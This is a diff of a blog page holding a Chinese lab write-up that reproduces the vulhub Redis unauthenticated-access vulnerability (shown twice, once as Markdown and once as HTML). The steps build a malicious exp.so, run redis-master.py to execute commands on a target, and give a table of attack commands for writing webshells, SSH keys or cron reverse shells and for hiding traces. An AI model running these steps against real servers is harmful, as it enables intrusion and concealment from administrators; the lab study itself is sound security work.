@@ -52,134 +52,216 @@
     <h1>vulhub redis 4-unacc漏洞复现</h1>
     <div class="post-meta">
       <time datetime="2025-10-27T12:34:16.000Z">2025.10.27</time>
-      <span>10 分钟阅读</span>
+      <span>6 分钟阅读</span>
     </div>
   </header>
   <div class="article-content">
-    
-# vulhub redis 4-unacc漏洞复现
-
-影响版本：redis 版本 < 6.x
-
-漏洞的产生条件有以下两点:
-
-1. Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网
-2. 没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务
-
-## 启动环境
-
-cd /vulhub/redis/4-unacc
-
-sudo docker-compose up -d
-
-## 查看信息
-
-sudo docker ps
-
-![image-20251025202848265](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251025202848265.png)
-
-端口号6379
-
-## 连接数据库
-
-redis-cli -h 127.0.0.1 -p 6379
-
-127.0.0.1:攻击机的IP地址
-
-redis存在未授权访问漏洞，在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。
-
-## getshell
-
-### redis-rogue-getshell
-
-漏洞背景：Redis 4.x及5.0.5之前的版本支持主从复制模式，攻击者可伪造一个恶意主节点（Master），诱导目标Redis作为从节点（Slave）连接，通过传输恶意数据流注入攻击载荷。
-
-**核心步骤**
-
-- **主从关系建立**
-  攻击机运行脚本`redis-master.py`，监听指定端口（如8989），伪装成主节点。目标Redis被设置为从节点后，会自动同步攻击机发送的数据。
-- **加载恶意模块**
-  脚本通过Redis的`MODULE LOAD`命令，将预编译的恶意模块`exp.so`上传至目标服务器。该模块包含执行系统命令的功能。
-- **命令执行**
-  利用模块中的`system.exec`方法执行`-c`参数指定的命令（如`ls`），从而控制目标服务器。
-
-git clone https://github.com/vulhub/redis-rogue-getshell.git    ## 先克隆redis-rogue-getshell
-
-cd redis-rogue-getshell/RedisModulesSDK 
-
-make  ## 一键编译（生成exp.so）看到最后出现 exp.so 文件就 OK，warning 无视
-
-编译已成功：
-
-![image-20251026153207996](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251026153207996.png)
-
-| 命令                                      | 作用                                                         |
-| ----------------------------------------- | ------------------------------------------------------------ |
-| `cd RedisModulesSDK/redis-rogue-getshell` | 进到源码目录（里面有 `Makefile` 和 `.c` 文件）。             |
-| `make`                                    | 读取 `Makefile`，自动调用 `gcc` 把 `module.c` 编译成 `exp.so`（即我们后面要加载的恶意动态库）。 |
-
-执行完会在当前目录下生成 `exp.so`，大小 10–30 KB 左右，**这就是后面 `-f` 参数要用的文件**。
-
-1. **`.so` 文件 = “插件”**
-   在 Linux 里相当于 Windows 的 `.dll`：
-
-   - 用 C/C++ 写的功能模块
-   - 可以动态加载到程序里，立即多出新的命令/功能
-
-2. **`system.exec` = 插件给你开的新“后门命令”**
-   正常 Redis 没有 `system.exec`，加载恶意 `.so` 后才出现。
-   作用：
-
-   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
-
-   
-
-   实际就是调用操作系统的 `/bin/sh -c whoami`，把结果返回给你。
-
-cd ..		# 回到redis-rogue-getshell 
-
-回到仓库根目录执行：
-`./redis-master.py -r <目标IP> -p 6379 -L <本机IP> -P 8989 -f RedisModulesSDK/exp/exp.so -c "whoami"`
-
-命令执行成功：
-
-![image-20251026154443198](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251026154443198.png)
-
-!NOTE:
-
-| `-r` | remote  | **目标 Redis 的 IP**（被攻击者）                             |
-| ---- | ------- | ------------------------------------------------------------ |
-| `-p` | port    | 目标 Redis 的端口，默认 6379                                 |
-| `-L` | local   | **攻击机自己的 IP**（脚本要在这台机临时起恶意 Redis 主节点） |
-| `-P` | Port    | 攻击机临时 Redis 的监听端口（主从同步用）                    |
-| `-f` | file    | 本地编译好的 **恶意模块文件路径**（exp.so）                  |
-| `-c` | command | 模块加载成功后，要在目标服务器执行的 **系统命令**            |
-
-# redis数据库命令
-
-| 序号 | 场景     | 命令                           | 作用                    | 实战一句话                                                   |
-| ---- | -------- | ------------------------------ | ----------------------- | ------------------------------------------------------------ |
-| 1    | 探活     | `PING`                         | 测试连通性              | 返回 `PONG` 说明主机存活且未设密码。                         |
-| 2    | 侦察     | `INFO` / `INFO server`         | 拿版本、OS、进程权限    | 版本≤5.x 且 run\_id 存在 → 可考虑主从RCE。                   |
-| 3    | 踩点     | `CONFIG GET dir`               | 查看当前工作目录        | 决定下一步把文件写到哪（cron/ssh/web）。                     |
-| 4    | 改路径   | `CONFIG SET dir <路径>`        | 在线改工作目录          | 把落盘路径切到 `/var/spool/cron/crontabs` 等。               |
-| 5    | 改文件名 | `CONFIG SET dbfilename <文件>` | 在线改RDB文件名         | 让 Redis 把数据存成 `root`、`authorized_keys`、`shell.php`。 |
-| 6    | 落盘     | `SAVE`                         | 立即触发持久化          | 把刚才 `SET` 的内容写进上面指定的文件。                      |
-| 7    | 写内容   | `SET x "<内容>"`               | 新建键值对              | 内容里夹带恶意代码、公钥、反弹shell语句。                    |
-| 8    | 清痕迹   | `FLUSHALL`                     | 清空所有库              | 删日志、删键，防止管理员发现异常键名。                       |
-| 9    | 主从复制 | `SLAVEOF <host> <port>`        | 把自己挂到攻击机当slave | 接收主节点推送的恶意 `.so` 模块文件。                        |
-| 10   | 加载模块 | `MODULE LOAD <so路径>`         | 动态装载外部模块        | 把攻击者推送的 `exp.so` 变成系统命令执行器。                 |
-| 11   | 卸载模块 | `MODULE UNLOAD <模块名>`       | 动态卸载模块            | 拿到shell后卸掉，让 `MODULE LIST` 看不出异常。               |
-| 12   | 退出     | `QUIT` 或 `EXIT`               | 关闭连接                | 打完收工，优雅退出。                                         |
-
-| **读取数据库内容** | 读写系统文件                                             | 执行系统命令         |
-| ------------------ | -------------------------------------------------------- | -------------------- |
-| 数据泄露           | 直接写webshell <br/> 计划任务反弹shell <br/> SSH免密登录 | redis-rogue-getshell |
+    <h1 id="vulhub-redis-4-unacc漏洞复现"><a href="#vulhub-redis-4-unacc漏洞复现" class="headerlink" title="vulhub redis 4-unacc漏洞复现"></a>vulhub redis 4-unacc漏洞复现</h1><p>影响版本：redis 版本 &lt; 6.x</p>
+<p>漏洞的产生条件有以下两点:</p>
+<ol>
+<li>Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</li>
+<li>没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</li>
+</ol>
+<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><p>cd &#x2F;vulhub&#x2F;redis&#x2F;4-unacc</p>
+<p>sudo docker-compose up -d</p>
+<h2 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h2><p>sudo docker ps</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251025202848265.png" alt="image-20251025202848265"></p>
+<p>端口号6379</p>
+<h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>redis-cli -h 127.0.0.1 -p 6379</p>
+<p>127.0.0.1:攻击机的IP地址</p>
+<p>redis存在未授权访问漏洞，在4.x&#x2F;5.0.5以前版本下，我们可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="redis-rogue-getshell"><a href="#redis-rogue-getshell" class="headerlink" title="redis-rogue-getshell"></a>redis-rogue-getshell</h3><p>漏洞背景：Redis 4.x及5.0.5之前的版本支持主从复制模式，攻击者可伪造一个恶意主节点（Master），诱导目标Redis作为从节点（Slave）连接，通过传输恶意数据流注入攻击载荷。</p>
+<p><strong>核心步骤</strong></p>
+<ul>
+<li><strong>主从关系建立</strong><br>攻击机运行脚本<code>redis-master.py</code>，监听指定端口（如8989），伪装成主节点。目标Redis被设置为从节点后，会自动同步攻击机发送的数据。</li>
+<li><strong>加载恶意模块</strong><br>脚本通过Redis的<code>MODULE LOAD</code>命令，将预编译的恶意模块<code>exp.so</code>上传至目标服务器。该模块包含执行系统命令的功能。</li>
+<li><strong>命令执行</strong><br>利用模块中的<code>system.exec</code>方法执行<code>-c</code>参数指定的命令（如<code>ls</code>），从而控制目标服务器。</li>
+</ul>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell.git">https://github.com/vulhub/redis-rogue-getshell.git</a>    ## 先克隆redis-rogue-getshell</p>
+<p>cd redis-rogue-getshell&#x2F;RedisModulesSDK </p>
+<p>make  ## 一键编译（生成exp.so）看到最后出现 exp.so 文件就 OK，warning 无视</p>
+<p>编译已成功：</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251026153207996.png" alt="image-20251026153207996"></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cd RedisModulesSDK/redis-rogue-getshell</code></td>
+<td>进到源码目录（里面有 <code>Makefile</code> 和 <code>.c</code> 文件）。</td>
+</tr>
+<tr>
+<td><code>make</code></td>
+<td>读取 <code>Makefile</code>，自动调用 <code>gcc</code> 把 <code>module.c</code> 编译成 <code>exp.so</code>（即我们后面要加载的恶意动态库）。</td>
+</tr>
+</tbody></table>
+<p>执行完会在当前目录下生成 <code>exp.so</code>，大小 10–30 KB 左右，<strong>这就是后面 <code>-f</code> 参数要用的文件</strong>。</p>
+<ol>
+<li><p><strong><code>.so</code> 文件 &#x3D; “插件”</strong><br>在 Linux 里相当于 Windows 的 <code>.dll</code>：</p>
+<ul>
+<li>用 C&#x2F;C++ 写的功能模块</li>
+<li>可以动态加载到程序里，立即多出新的命令&#x2F;功能</li>
+</ul>
+</li>
+<li><p><strong><code>system.exec</code> &#x3D; 插件给你开的新“后门命令”</strong><br>正常 Redis 没有 <code>system.exec</code>，加载恶意 <code>.so</code> 后才出现。<br>作用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
 
 
 
-
-
+<p>实际就是调用操作系统的 <code>/bin/sh -c whoami</code>，把结果返回给你。</p>
+</li>
+</ol>
+<p>cd ..		# 回到redis-rogue-getshell </p>
+<p>回到仓库根目录执行：<br><code>./redis-master.py -r &lt;目标IP&gt; -p 6379 -L &lt;本机IP&gt; -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
+<p>命令执行成功：</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251026154443198.png" alt="image-20251026154443198"></p>
+<p>!NOTE:</p>
+<table>
+<thead>
+<tr>
+<th><code>-r</code></th>
+<th>remote</th>
+<th><strong>目标 Redis 的 IP</strong>（被攻击者）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p</code></td>
+<td>port</td>
+<td>目标 Redis 的端口，默认 6379</td>
+</tr>
+<tr>
+<td><code>-L</code></td>
+<td>local</td>
+<td><strong>攻击机自己的 IP</strong>（脚本要在这台机临时起恶意 Redis 主节点）</td>
+</tr>
+<tr>
+<td><code>-P</code></td>
+<td>Port</td>
+<td>攻击机临时 Redis 的监听端口（主从同步用）</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>file</td>
+<td>本地编译好的 <strong>恶意模块文件路径</strong>（exp.so）</td>
+</tr>
+<tr>
+<td><code>-c</code></td>
+<td>command</td>
+<td>模块加载成功后，要在目标服务器执行的 <strong>系统命令</strong></td>
+</tr>
+</tbody></table>
+<h1 id="redis数据库命令"><a href="#redis数据库命令" class="headerlink" title="redis数据库命令"></a>redis数据库命令</h1><table>
+<thead>
+<tr>
+<th>序号</th>
+<th>场景</th>
+<th>命令</th>
+<th>作用</th>
+<th>实战一句话</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>探活</td>
+<td><code>PING</code></td>
+<td>测试连通性</td>
+<td>返回 <code>PONG</code> 说明主机存活且未设密码。</td>
+</tr>
+<tr>
+<td>2</td>
+<td>侦察</td>
+<td><code>INFO</code> &#x2F; <code>INFO server</code></td>
+<td>拿版本、OS、进程权限</td>
+<td>版本≤5.x 且 run_id 存在 → 可考虑主从RCE。</td>
+</tr>
+<tr>
+<td>3</td>
+<td>踩点</td>
+<td><code>CONFIG GET dir</code></td>
+<td>查看当前工作目录</td>
+<td>决定下一步把文件写到哪（cron&#x2F;ssh&#x2F;web）。</td>
+</tr>
+<tr>
+<td>4</td>
+<td>改路径</td>
+<td><code>CONFIG SET dir &lt;路径&gt;</code></td>
+<td>在线改工作目录</td>
+<td>把落盘路径切到 <code>/var/spool/cron/crontabs</code> 等。</td>
+</tr>
+<tr>
+<td>5</td>
+<td>改文件名</td>
+<td><code>CONFIG SET dbfilename &lt;文件&gt;</code></td>
+<td>在线改RDB文件名</td>
+<td>让 Redis 把数据存成 <code>root</code>、<code>authorized_keys</code>、<code>shell.php</code>。</td>
+</tr>
+<tr>
+<td>6</td>
+<td>落盘</td>
+<td><code>SAVE</code></td>
+<td>立即触发持久化</td>
+<td>把刚才 <code>SET</code> 的内容写进上面指定的文件。</td>
+</tr>
+<tr>
+<td>7</td>
+<td>写内容</td>
+<td><code>SET x &quot;&lt;内容&gt;&quot;</code></td>
+<td>新建键值对</td>
+<td>内容里夹带恶意代码、公钥、反弹shell语句。</td>
+</tr>
+<tr>
+<td>8</td>
+<td>清痕迹</td>
+<td><code>FLUSHALL</code></td>
+<td>清空所有库</td>
+<td>删日志、删键，防止管理员发现异常键名。</td>
+</tr>
+<tr>
+<td>9</td>
+<td>主从复制</td>
+<td><code>SLAVEOF &lt;host&gt; &lt;port&gt;</code></td>
+<td>把自己挂到攻击机当slave</td>
+<td>接收主节点推送的恶意 <code>.so</code> 模块文件。</td>
+</tr>
+<tr>
+<td>10</td>
+<td>加载模块</td>
+<td><code>MODULE LOAD &lt;so路径&gt;</code></td>
+<td>动态装载外部模块</td>
+<td>把攻击者推送的 <code>exp.so</code> 变成系统命令执行器。</td>
+</tr>
+<tr>
+<td>11</td>
+<td>卸载模块</td>
+<td><code>MODULE UNLOAD &lt;模块名&gt;</code></td>
+<td>动态卸载模块</td>
+<td>拿到shell后卸掉，让 <code>MODULE LIST</code> 看不出异常。</td>
+</tr>
+<tr>
+<td>12</td>
+<td>退出</td>
+<td><code>QUIT</code> 或 <code>EXIT</code></td>
+<td>关闭连接</td>
+<td>打完收工，优雅退出。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>读取数据库内容</strong></th>
+<th>读写系统文件</th>
+<th>执行系统命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数据泄露</td>
+<td>直接写webshell <br/> 计划任务反弹shell <br/> SSH免密登录</td>
+<td>redis-rogue-getshell</td>
+</tr>
+</tbody></table>
 
   </div>
 </article>
